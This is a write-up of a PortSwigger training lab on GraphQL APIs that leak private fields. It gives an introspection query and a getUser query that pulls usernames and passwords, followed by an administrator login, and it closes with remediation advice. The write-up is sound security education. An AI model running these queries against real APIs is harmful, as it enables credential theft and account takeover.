# Lab: Accidental Exposure of Private GraphQL Fields

**Category:** GraphQL API Vulnerabilities
**Difficulty:** Apprentice
**Lab link:** [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

## Overview

Developers sometimes add sensitive fields (passwords, tokens) to GraphQL types during development and forget to remove them. GraphQL's introspection feature exposes the full schema to any client, revealing these hidden fields. By querying them directly, an attacker can obtain admin credentials and take over accounts.

## Key Concepts

- **Introspection:** GraphQL's built-in `__schema` and `__type` queries let any client discover the full API schema — all types, fields, queries, and mutations.
- **Accidental field exposure:** A `password` or `token` field left on a user type is queryable by anyone who knows it exists — introspection makes it discoverable.
- **Defense in depth failure:** Hiding fields from the front-end UI is not a security control; the API exposes them regardless.

## Exploit Flow

### Step 1 — Run introspection to discover the schema

```json
{"query": "query { __schema { types { name fields { name } } } }"}
```

Look for a `User` type or similar with sensitive fields like `password`, `username`, `token`.

### Step 2 — Query the sensitive fields

```graphql
query getUser {
    getUser(id: 1) {
        id
        username
        password
    }
}
```

Enumerate IDs if needed to find the administrator account.

### Step 3 — Log in as administrator

Use the retrieved credentials to log in and solve the lab.

## Remediation

- **Disable introspection in production.** Most GraphQL servers support a configuration flag to block `__schema` and `__type` queries.
- Remove all sensitive fields from GraphQL types before deploying to production.
- Implement field-level authorization so sensitive fields are only accessible to authorized roles even if they remain in the schema.
- Conduct schema reviews as part of the security code review process.

## Key Takeaways

- Introspection is a powerful recon tool — always test it against GraphQL endpoints.
- "Hidden" fields in GraphQL are only hidden from the front-end, not from the API.
- Disabling introspection is not sufficient alone — it only slows discovery; field-level auth is the real fix.
